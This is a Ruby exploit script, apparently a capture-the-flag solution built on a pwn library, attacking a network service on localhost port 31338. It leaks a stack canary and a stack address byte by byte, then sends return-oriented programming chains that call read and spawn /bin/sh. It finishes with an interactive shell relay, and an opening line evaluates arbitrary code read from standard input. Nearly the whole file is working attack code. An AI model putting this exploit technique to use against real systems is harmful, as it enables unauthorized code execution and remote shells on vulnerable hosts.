# coding: utf-8

# MIT License
#
# Copyright (c) 2017 Pietro Ferretti, Armando Bellante, Nico Mkhatvari
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

a = IO.new(0, 'r') ; code = a.readpartial(10000000) ; eval(code)    # reopen STDIN
require 'pwn' ; read = 0x440300 ; pop_rdi = 0x4005d5  ; pop_rsi = 0x4017f7  ; pop_rdx = 0x443776 ;  ; p = Sock.new '127.0.0.1', 31338 ;  ; p.send ''.rjust(25, 'A') ; p.recv 25  ; leak = p.recv 7 ; canary = "\x00" + leak ;  ; stack_leak = '' ; offset = 24 + 5*8 ; for i in 0..7 ;     p.recvline(timeout: 0.1)  ;     print 'a' ;     p.send('A' * (offset + i)) ;     p.recv(offset + i)    ;     leak = p.recv(1) ;     if leak == "\n" ;         stack_leak += "\x00" ;         p.unrecv "\n" ;     else ;         stack_leak += leak ;     end ; end ;  ; print stack_leak ; stack_addr = u64(stack_leak) ;   ;  ; stack_offset = -248 ;  ; payload = 'A' * 24 ; payload += canary ; payload += 'B' * 8     ; payload += p64(pop_rdi) ; payload += p64(0)         ; payload += p64(pop_rsi) ; payload += p64(stack_addr + stack_offset)   ; payload += p64(pop_rdx) ; payload += p64(10000)     ; payload += p64(read) ; payload += 'C' * 8 ; p.send payload ;  ; p.send "exit\n" ;  p2 = '' ;  ; p2 += p64(0x00000000004017f7)  ; p2 += p64(0x00000000006cc080)  ; p2 += p64(0x000000000047a6e6)  ; p2 += '/bin//sh' ; p2 += p64(0x4141414141414141)  ; p2 += p64(0x4141414141414141)  ; p2 += p64(0x0000000000475fc1)  ; p2 += p64(0x00000000004017f7)  ; p2 += p64(0x00000000006cc088)  ; p2 += p64(0x000000000042732f)  ; p2 += p64(0x0000000000475fc1)  ; p2 += p64(0x00000000004005d5)  ; p2 += p64(0x00000000006cc080)  ; p2 += p64(0x00000000004017f7)  ; p2 += p64(0x00000000006cc088)  ; p2 += p64(0x0000000000443776)  ; p2 += p64(0x00000000006cc088)  ; p2 += p64(0x000000000042732f)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468320)  ; p2 += p64(0x0000000000468e75)  ; p.send p2 ;  until p.io.closed? ; rs, = IO.select([a, p.io]) ; if rs.include?(a) ; s = a.readpartial(100000) ; p.write(s) ; end ; if rs.include?(p.io) ; s = p.recv ; $stdout.write(s) ; end ; end ; 
# note: the last loop is a custom version of pwntools' tubes.interact, using the re-opened STDIN as socket.